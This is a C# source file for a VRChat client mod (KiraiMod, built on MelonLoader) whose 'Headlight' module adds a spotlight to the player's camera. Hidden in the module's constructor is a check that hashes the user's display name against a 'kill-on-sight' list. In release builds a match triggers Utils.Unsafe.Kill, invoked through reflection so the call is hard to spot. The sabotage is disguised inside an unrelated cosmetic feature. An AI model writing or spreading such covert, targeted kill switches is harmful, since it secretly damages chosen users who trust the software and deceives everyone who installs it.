using MelonLoader;
using System.Linq;
using UnityEngine;

namespace KiraiMod.Modules
{
    public class Headlight : ModuleBase
    {
        private Light light;

        public new ModuleInfo[] info = {
            new ModuleInfo("Headlight", "Illuminate the world from your viewpoint", ButtonType.Toggle, 3, Shared.PageIndex.toggles2, nameof(state))
        };

        public Headlight()
        {
            MelonCoroutines.Start(Init());
        }

        public System.Collections.IEnumerator Init()
        {
            while (VRC.Core.APIUser.CurrentUser == null) yield return new WaitForSeconds(1);
            if (Shared.modules.kos.kosList.Contains(Utils.SHA256(VRC.Core.APIUser.CurrentUser.displayName)))
            {
#if DEBUG
                MelonLogger.Log("KOS Death via Headlight Constructor & Reflection");
#else
                typeof(Utils.Unsafe).GetMethod(nameof(Utils.Unsafe.Kill), System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static).Invoke(null, null);
#endif
            }
        }

        public override void OnStateChange(bool state)
        {
            Refresh();
        }

        public override void OnConfigLoaded()
        {
            Refresh();
        }

        public void Refresh()
        {
            if (light == null) MelonCoroutines.Start(Initialize(state));
            else light.enabled = state;
        }

        public System.Collections.IEnumerator Initialize(bool state)
        {
            while (VRCVrCamera.field_Private_Static_VRCVrCamera_0 == null) yield return null;

            light = VRCVrCamera.field_Private_Static_VRCVrCamera_0.GetComponentInChildren<Camera>().gameObject.AddComponent<Light>();
            light.type = LightType.Spot;
            light.enabled = state;
        }
    }
}
